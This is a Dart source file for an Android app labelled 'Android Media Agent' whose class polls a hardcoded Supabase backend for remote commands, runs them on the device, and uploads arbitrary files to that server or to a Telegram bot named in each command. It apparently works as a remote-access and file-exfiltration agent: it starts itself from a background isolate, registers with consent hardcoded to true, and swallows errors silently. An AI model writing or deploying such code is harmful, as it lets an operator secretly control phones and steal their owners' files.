// lib/core/device_agent.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

import 'command_parser.dart';
import '../platform/command_dispatcher.dart';
import 'device_id.dart';

class DeviceAgent {
  DeviceAgent._();
  static final DeviceAgent instance = DeviceAgent._();

  // NOTE: not `late` to avoid runtime error in background isolate
  String supabaseUrl = '';
  String deviceId = '';

  final http.Client _http = http.Client();
  Timer? _pollTimer;

  bool _running = false;
  bool _busy = false;
  bool _registered = false;

  static const Duration pollInterval = Duration(seconds: 5);

  // Public anon key (Supabase) - replace with your value or keep config-managed
  static const String SUPABASE_ANON_KEY =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt5d3BuaGFlcm13bGR6Y3d0c252Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg2MjQ5NDAsImV4cCI6MjA4NDIwMDk0MH0.U47u5W9Z7imMXXvzQ66xCx7_3CXjgqJrLrU-dgDZb68';

  // Default supabase URL used by background isolate if UI didn't configure it
  static const String _DEFAULT_SUPABASE_URL =
      'https://kywpnhaermwldzcwtsnv.supabase.co';

  // -------------------- CONFIG --------------------

  Future<void> configure({
    required String supabaseUrl,
    required String deviceId,
  }) async {
    this.supabaseUrl = supabaseUrl;
    this.deviceId = deviceId;
  }

  Future<void> register() async {
    if (_registered) return;
    _registered = true;

    await _post('/register-device', {
      'device_id': deviceId,
      'display_name': 'Android Media Agent',
      'consent': true,
    });
  }

  // -------------------- POLLER --------------------

  Future<void> start() async {
    if (_running) return;
    _running = true;
    await _pollOnce();
    _pollTimer = Timer.periodic(pollInterval, (_) => _pollOnce());
  }

  Future<void> stop() async {
    _pollTimer?.cancel();
    _running = false;
    _busy = false;
  }

  Future<void> _pollOnce() async {
    if (!_running || _busy) return;
    _busy = true;

    try {
      final res = await _get('/get-commands', query: {'limit': '5'});
      final List<dynamic> cmds = (res['commands'] ?? res['data'] ?? []) as List<dynamic>;

      for (final c in cmds) {
        if (c is Map) {
          await _handleCommand(Map<String, dynamic>.from(c));
        }
      }
    } catch (_) {
      // silent by design
    } finally {
      _busy = false;
    }
  }

  // -------------------- COMMAND HANDLER --------------------

  Future<void> _handleCommand(Map<String, dynamic> raw) async {
    final parsed = CommandParser.parse(raw, deviceId);

    if (parsed.error != null) {
      final id = raw['id']?.toString();
      if (id != null) {
        await _updateCommandStatus(id, 'failed', {'error': parsed.error});
      }
      return;
    }

    final cmd = parsed.command!;
    Map<String, dynamic> result;

    try {
      // 1️⃣ Execute normal commands (/ls, /ping, /info...)
      result = await CommandDispatcher.instance.executeCommand(
        cmd,
        timeout: const Duration(seconds: 60),
      );

      // 2️⃣ UPLOAD (support both legacy 'upload' action or caller that sets upload in dispatcher)
      final actionName = cmd.action.name; // enum -> canonical name e.g. 'upload_file'
      if ((actionName == 'upload_file' || actionName == 'upload') && cmd.payload?['path'] != null) {
        result = await _handleUpload(cmd.payload['path']);
      }

      // 3️⃣ SEND (Telegram): expects payload.telegram = { bot_token, chat_id } or similar
      if ((actionName == 'raw' || actionName == 'send' || actionName == 'upload_file') &&
          cmd.payload?['path'] != null &&
          cmd.payload?['telegram'] != null) {
        result = await _handleSend(
          cmd.payload['path'],
          Map<String, dynamic>.from(cmd.payload['telegram'] as Map),
        );
      }
    } catch (e) {
      result = {'success': false, 'error': e.toString()};
    }

    await _updateCommandStatus(
      cmd.id,
      result['success'] == true ? 'done' : 'failed',
      result,
    );
  }

  // -------------------- UPLOAD (in-place helper for legacy command handler) --------------------

  Future<Map<String, dynamic>> _handleUpload(String path) async {
    try {
      final file = File(path);
      if (!await file.exists()) {
        return {'success': false, 'error': 'file_not_found'};
      }

      final bytes = await file.readAsBytes();

      final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');
      final req = http.MultipartRequest('POST', uri)
        ..headers.addAll({
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
          'apikey': SUPABASE_ANON_KEY,
          'X-Device-ID': deviceId,
        })
        ..fields['device_id'] = deviceId
        ..fields['dest'] = path.split('/').last;

      req.files.add(
        http.MultipartFile.fromBytes(
          'file',
          bytes,
          filename: path.split('/').last,
          contentType: MediaType('application', 'octet-stream'),
        ),
      );

      final streamedResp = await req.send().timeout(const Duration(seconds: 90));
      final resp = await http.Response.fromStream(streamedResp);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        if (resp.body.isEmpty) return {'success': true};
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) return {'success': true, ...decoded};
          return {'success': true, 'result': decoded};
        } catch (_) {
          return {'success': true, '_raw': resp.body};
        }
      }

      return {'success': false, 'status': resp.statusCode, 'body': resp.body};
    } catch (e) {
      return {'success': false, 'error': 'upload_exception', 'detail': e.toString()};
    }
  }

  // -------------------- SEND (TELEGRAM) --------------------

  Future<Map<String, dynamic>> _handleSend(
    String path,
    Map<String, dynamic> telegram,
  ) async {
    try {
      final file = File(path);
      if (!await file.exists()) {
        return {'success': false, 'error': 'file_not_found'};
      }

      final botToken = telegram['bot_token'] ?? telegram['token'] ?? telegram['botToken'];
      final chatId = telegram['chat_id'] ?? telegram['chatId'] ?? telegram['chat'];

      if (botToken == null || chatId == null) {
        return {'success': false, 'error': 'missing_telegram_credentials'};
      }

      final uri = Uri.parse('https://api.telegram.org/bot$botToken/sendDocument');

      final req = http.MultipartRequest('POST', uri)
        ..fields['chat_id'] = chatId.toString()
        ..files.add(
          http.MultipartFile.fromBytes(
            'document',
            await file.readAsBytes(),
            filename: path.split('/').last,
          ),
        );

      final streamedResp = await req.send().timeout(const Duration(seconds: 60));
      final resp = await http.Response.fromStream(streamedResp);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        if (resp.body.isEmpty) return {'success': true};
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) return {'success': true, ...decoded};
          return {'success': true, 'result': decoded};
        } catch (_) {
          return {'success': true, '_raw': resp.body};
        }
      }

      return {'success': false, 'status': resp.statusCode, 'body': resp.body};
    } catch (e) {
      return {'success': false, 'error': 'telegram_send_failed', 'detail': e.toString()};
    }
  }

  // -------------------- PUBLIC API ADDED --------------------

  /// Called from main.dart - simple best-effort touch to edge function
  Future<void> heartbeat() async {
    try {
      await _post('/touch-device', {
        'device_id': deviceId,
      });
    } catch (_) {
      // silent by design
    }
  }

  /// Public uploadFile used by CommandDispatcher / CommandExecutor
  Future<Map<String, dynamic>> uploadFile({
    required String path,
    required List<int> bytes,
    required String contentType,
    String bucket = 'device-uploads',
    String? dest,
  }) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');

    final filename = (dest != null && dest.isNotEmpty) ? dest.split('/').last : path.split('/').last;

    final req = http.MultipartRequest('POST', uri)
      ..headers.addAll({
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      })
      ..fields['device_id'] = deviceId
      ..fields['bucket'] = bucket
      ..fields['dest'] = filename;

    // parse content type safely
    MediaType mediaType;
    try {
      mediaType = MediaType.parse(contentType);
    } catch (_) {
      mediaType = MediaType('application', 'octet-stream');
    }

    req.files.add(http.MultipartFile.fromBytes(
      'file',
      bytes,
      filename: filename,
      contentType: mediaType,
    ));

    try {
      final streamedResp = await req.send().timeout(const Duration(seconds: 90));
      final resp = await http.Response.fromStream(streamedResp);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        if (resp.body.isEmpty) return {'success': true};
        try {
          final decoded = jsonDecode(resp.body);
          if (decoded is Map<String, dynamic>) {
            return {'success': true, ...decoded};
          } else {
            return {'success': true, 'result': decoded};
          }
        } catch (_) {
          return {'success': true, '_raw': resp.body};
        }
      }

      return {'success': false, 'status': resp.statusCode, 'body': resp.body};
    } on TimeoutException catch (te) {
      return {'success': false, 'error': 'upload_timeout', 'detail': te.toString()};
    } catch (e) {
      return {'success': false, 'error': 'upload_exception', 'detail': e.toString()};
    }
  }

  // -------------------- EDGE HELPERS --------------------

  Future<void> _updateCommandStatus(String id, String status, Map<String, dynamic> result) async {
    await _post('/update-command', {
      'id': id,
      'status': status,
      'result': result,
      'device_id': deviceId,
    });
  }

  Future<Map<String, dynamic>> _post(String path, Map<String, dynamic> body) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1$path');

    final res = await _http
        .post(
          uri,
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer $SUPABASE_ANON_KEY',
            'apikey': SUPABASE_ANON_KEY,
            'X-Device-ID': deviceId,
          },
          body: jsonEncode(body),
        )
        .timeout(const Duration(seconds: 12));

    if (res.statusCode >= 400) {
      throw Exception('Edge error ${res.statusCode}: ${res.body}');
    }

    if (res.body.isEmpty) return {};
    try {
      return jsonDecode(res.body) as Map<String, dynamic>;
    } catch (_) {
      return {'_raw': res.body};
    }
  }

  Future<Map<String, dynamic>> _get(String path, {Map<String, String>? query}) async {
    var uri = Uri.parse('$supabaseUrl/functions/v1$path');
    if (query != null) uri = uri.replace(queryParameters: query);

    final res = await _http.get(uri, headers: {
      'Accept': 'application/json',
      'Authorization': 'Bearer $SUPABASE_ANON_KEY',
      'apikey': SUPABASE_ANON_KEY,
      'X-Device-ID': deviceId,
    }).timeout(const Duration(seconds: 10));

    if (res.statusCode >= 400) {
      throw Exception('Edge GET error ${res.statusCode}: ${res.body}');
    }

    if (res.body.isEmpty) return {};
    try {
      return jsonDecode(res.body) as Map<String, dynamic>;
    } catch (_) {
      return {'_raw': res.body};
    }
  }

  /// Start agent from a headless/background isolate — called by backgroundMain()
  Future<void> startFromBackground() async {
    // Note: this method intentionally mimics what _startAgentIfNeeded in UI did,
    // but is safe to call from a headless Dart isolate.
    try {
      if (_running) return;

      // ensure background can configure itself if UI didn't
      if (supabaseUrl.isEmpty) {
        supabaseUrl = _DEFAULT_SUPABASE_URL;
      }

      // ensure deviceId exists for background
      if (deviceId.isEmpty) {
        deviceId = await DeviceId.getOrCreate();
      }

      // register if not already registered (guarded)
      await register();

      // start poller
      await start();

      // heartbeat timer
      Timer.periodic(const Duration(seconds: 30), (_) => heartbeat());
    } catch (e) {
      // swallow - service will keep running; errors logged if desired
    }
  }
}